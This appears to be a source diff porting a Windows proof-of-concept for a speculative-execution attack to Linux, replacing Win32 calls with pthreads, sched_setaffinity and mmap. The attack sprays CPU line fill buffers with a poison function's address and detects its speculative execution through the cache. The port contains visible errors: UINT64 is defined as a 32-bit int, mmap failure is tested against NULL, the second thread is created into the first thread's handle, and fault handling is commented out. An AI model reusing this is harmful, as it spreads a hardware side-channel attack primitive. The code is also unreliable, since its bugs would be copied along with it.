@@ -1,5 +1,45 @@
-#include <windows.h>
+//#include <windows.h>
+#define _GNU_SOURCE
 #include <stdio.h>
+#include <setjmp.h>
+#include <sched.h>
+#include <string.h>
+#include <pthread.h>
+#include <emmintrin.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+
+//#include "asmhelper.h"
+
+#ifndef DWORD
+#define WINAPI
+typedef unsigned long DWORD;
+typedef DWORD* DWORD_PTR;
+typedef short WCHAR;
+typedef void * HANDLE;
+#define MAX_PATH    PATH_MAX
+typedef unsigned char BYTE;
+typedef unsigned short WORD;
+typedef unsigned int BOOL;
+typedef void VOID;
+typedef BYTE* PBYTE;
+typedef unsigned int UINT64;
+typedef void* PVOID;
+typedef size_t SIZE_T;
+typedef UINT64* PUINT64;
+//#define MEM_RESERVE
+//#define MEM_COMMIT
+//#define PAGE_READWRITE
+#define TRUE 1
+//#define __try try
+//#define __except except
+// refer: https://web.archive.org/web/20091104065428/http://www.di.unipi.it/~nids/docs/longjump_try_trow_catch.html
+#define TRY do{ jmp_buf ex_buf__; switch( setjmp(ex_buf__) ){ case 0:
+#define CATCH(x) break; case x:
+#define ETRY } }while(0)
+#define THROW(x) longjmp(ex_buf__, x)
+#endif
 
 VOID SprayFillBuffers(PBYTE buffer);
 VOID PoisonFunction(PBYTE target);
@@ -12,10 +52,15 @@ UINT64 gTargetPage = 0x00000000BDBD0000;
 
 DWORD Thread1(PVOID Argument)
 {
-    DWORD_PTR aff = 0x02;
-    SetThreadAffinityMask(GetCurrentThread(), aff);
+    //DWORD_PTR aff = 0x02;
+    //SetThreadAffinityMask(GetCurrentThread(), aff);
+    //https://stackoverflow.com/questions/10490756/how-to-use-sched-getaffinity-and-sched-setaffinity-in-linux-from-c
+    cpu_set_t my_set;        /* Define your cpu_set bit mask. */
+    CPU_ZERO(&my_set);       /* Initialize it all to 0, i.e. no CPUs selected. */
+    CPU_SET(7, &my_set);     /* set the bit that represents core 7. */
+    sched_setaffinity(0, sizeof(cpu_set_t), &my_set);
 
-    UNREFERENCED_PARAMETER(Argument);
+    //UNREFERENCED_PARAMETER(Argument);
 
     printf("Spray thread started...\n");
 
@@ -31,24 +76,32 @@ DWORD Thread1(PVOID Argument)
 
 DWORD Thread2(PVOID Argument)
 {
-    DWORD_PTR aff = 0x01;
-    SetThreadAffinityMask(GetCurrentThread(), aff);
+    //DWORD_PTR aff = 0x01;
+    //SetThreadAffinityMask(GetCurrentThread(), aff);
+    //https://stackoverflow.com/questions/10490756/how-to-use-sched-getaffinity-and-sched-setaffinity-in-linux-from-c
+    cpu_set_t my_set;        /* Define your cpu_set bit mask. */
+    CPU_ZERO(&my_set);       /* Initialize it all to 0, i.e. no CPUs selected. */
+    CPU_SET(7, &my_set);     /* set the bit that represents core 7. */
+    sched_setaffinity(0, sizeof(cpu_set_t), &my_set);
 
-    UNREFERENCED_PARAMETER(Argument);
+    //UNREFERENCED_PARAMETER(Argument);
 
     printf("Victim thread started...\n");
 
     while (TRUE)
     {
-        __try
-        {
+        //__try
+        //TRY
+        //{
             // Wither VictimFunctionTsx or VictimFunctionFault will do.
             VictimFunctionTsx(0);
             ///VictimFunctionFault(0);
-        }
-        __except (EXCEPTION_EXECUTE_HANDLER)
-        {
-        }
+        //}
+        //__except (EXCEPTION_EXECUTE_HANDLER)
+        //CATCH (EXCEPTION_EXECUTE_HANDLER)
+        //{
+        //}
+        //ETRY;
 
         // Check if the gTargetPage has been cached. Note that the only place this page is accessed from is the
         // PoisonFunction, so if we see this page cached, we now that the PoisonFunction got executed speculatively.
@@ -94,11 +147,22 @@ int main(int argc, char *argv[])
         // Allocate the target buffer. This buffer will be accessed speculatively by the PoisonFunction, if it ever
         // gets executed.
         // If we see that this gTargetPage is cached, we will now that PoisonFunction got executed speculatively.
-        target = VirtualAlloc((PVOID)(SIZE_T)gTargetPage, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        //target = VirtualAlloc((PVOID)(SIZE_T)gTargetPage, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        int fd = -1;
+        if ((fd = open("/dev/zero", O_RDWR, 0)) == -1) {
+            printf("open failed\n");
+            return -1;
+        }
+        target = mmap(gTargetPage, 0x10000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FILE, fd, 0);
         if (NULL == target)
         {
-            printf("Poison buffer alloc failed: 0x%08x\n", GetLastError());
+            //printf("Poison buffer alloc failed: 0x%08x\n", GetLastError());
+            printf("Poison buffer alloc failed: 0x%08x (%s)\n", errno, strerror(errno));
             return -1;
+        }
+        if (mprotect(target, 0x10000, PROT_WRITE | PROT_READ) != 0) {
+            printf("Poison buffer commit failed: 0x%08x (%s)\n", errno, strerror(errno));
+            return 1;
         }
 
         memset(target, 0xCC, 0x10000);
@@ -112,11 +176,22 @@ int main(int argc, char *argv[])
         // Allocate the page containing the address of our function. We will access this page in a loop, in order
         // to spray the LFBs with the address of the PoisonFunction, hoping that a branch will speculatively fetch
         // its address from the LFBs.
-        gSprayPage = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        //gSprayPage = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        int fd = -1;
+        if ((fd = open("/dev/zero", O_RDWR, 0)) == -1) {
+            printf("open failed\n");
+            return -1;
+        }
+        gSprayPage = mmap(NULL, 0x1000, PROT_NONE, MAP_SHARED | MAP_FILE, fd, 0);
         if (NULL == gSprayPage)
         {
-            printf("Function page alloc failed: 0x%08x\n", GetLastError());
+            //printf("Function page alloc failed: 0x%08x\n", GetLastError());
+            printf("Function page alloc failed: 0x%08x (%s)\n", errno, strerror(errno));
             return -1;
+        }
+        if (mprotect(gSprayPage, 0x1000, PROT_WRITE | PROT_READ) != 0) {
+            printf("Function page commit failed: 0x%08x (%s)\n", errno, strerror(errno));
+            return 1;
         }
 
         // Fill the page with the address of the poison function.
@@ -127,38 +202,55 @@ int main(int argc, char *argv[])
     }
 
     // Create the 2 threads.
-    DWORD tid1, tid2;
-    HANDLE th1, th2;
+    //DWORD tid1, tid2;
+    //HANDLE th1, th2;
+    pthread_t t1, t2;
 
-    tid1 = tid2 = 0;
-    th1 = th2 = NULL;
+    //tid1 = tid2 = 0;
+    //th1 = th2 = NULL;
+    t1 = t2 = -1;
+    int err = 0;
 
     if (mode == 0)
     {
         // Create both the attacker and the victim.
-        th1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread1, NULL, 0, &tid1);
-        th2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread2, NULL, 0, &tid2);
+        //th1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread1, NULL, 0, &tid1);
+        //th2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread2, NULL, 0, &tid2);
+        if ((err = pthread_create(&t1, NULL, Thread1, NULL)) != 0) {
+            printf("error creating thread 1: %s\n", strerror(err));
+        }
+        if ((err = pthread_create(&t1, NULL, Thread2, NULL)) != 0) {
+            printf("error creating thread 2: %s\n", strerror(err));
+        }
     }
     else if (mode == 1)
     {
         // Create only the attacker.
-        th1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread1, NULL, 0, &tid1);
+        //th1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread1, NULL, 0, &tid1);
+        if ((err = pthread_create(&t1, NULL, Thread1, NULL)) != 0) {
+            printf("error creating thread 1: %s\n", strerror(err));
+        }
     }
     else if (mode == 2)
     {
         // Create only the victim.
-        th2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread2, NULL, 0, &tid2);
+        //th2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread2, NULL, 0, &tid2);
+        if ((err = pthread_create(&t2, NULL, Thread2, NULL)) != 0) {
+            printf("error creating thread 2: %s\n", strerror(err));
+        }
     }
 
     // Will never return, since the threads execute an infinite loop.
     if (mode == 0 || mode == 1)
     {
-        WaitForSingleObject(th1, INFINITE);
+        //WaitForSingleObject(th1, INFINITE);
+        pthread_join(t1, NULL);
     }
 
     if (mode == 0 || mode == 2)
     {
-        WaitForSingleObject(th2, INFINITE);
+        //WaitForSingleObject(th2, INFINITE);
+        pthread_join(t2, NULL);
     }
 
     return 0;
